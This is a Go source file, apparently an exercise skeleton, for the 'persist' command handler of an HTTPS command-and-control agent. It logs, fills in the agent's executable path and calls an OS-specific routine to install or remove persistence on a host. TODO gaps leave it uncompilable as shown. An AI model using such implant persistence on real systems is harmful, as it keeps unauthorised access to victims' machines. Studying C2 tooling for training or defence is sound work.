package agent

import (
	"encoding/json"
	"fmt"
	"log"
	"os"

	"c2framework/internals/control"
	"c2framework/internals/server"
)

// orchestratePersist is the orchestrator for the "persist" command
func (agent *HTTPSAgent) orchestratePersist(job *server.HTTPSResponse) AgentTaskResult {

	// Unmarshal arguments
	var persistArgs control.PersistArgsAgent
	if err := json.Unmarshal(job.Arguments, &persistArgs); err != nil {
		errMsg := fmt.Sprintf("Failed to unmarshal PersistArgs for Task ID %s: %v", job.JobID, err)
		log.Printf("|ERR PERSIST ORCHESTRATOR| %s", errMsg)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "failed to unmarshal PersistArgs",
		}
	}

	action := "Installing"
	if persistArgs.Remove {
		action = "Removing"
	}
	log.Printf("|PERSIST ORCHESTRATOR| Task ID: %s. %s persistence via %s",
		job.JobID, action, persistArgs.Method)

	// Get our own executable path
	// TODO: get our own executable path by calling os.Executable(), save as execPath

	if err != nil {
		log.Printf("|ERR PERSIST ORCHESTRATOR| Failed to get executable path: %v", err)
		return AgentTaskResult{
			JobID:   job.JobID,
			Success: false,
			Error:   "failed to get executable path",
		}
	}

	// TODO: Set AgentPath field of persistArgs equal to execPath

	// Call the OS-specific doer
	// TODO: call doPersist(), pass persistArgs as arg, returns result
	result := doPersist(persistArgs)

	// Build the final result
	finalResult := AgentTaskResult{
		JobID: job.JobID,
	}

	outputJSON, _ := json.Marshal(result)
	finalResult.CommandResult = outputJSON

	if !result.Success {
		log.Printf("|ERR PERSIST ORCHESTRATOR| Persistence failed for TaskID %s: %s",
			job.JobID, result.Message)
		finalResult.Error = result.Message
		finalResult.Success = false
	} else {
		log.Printf("|PERSIST SUCCESS| %s for TaskID %s", result.Message, job.JobID)
		finalResult.Success = true
	}

	return finalResult
}
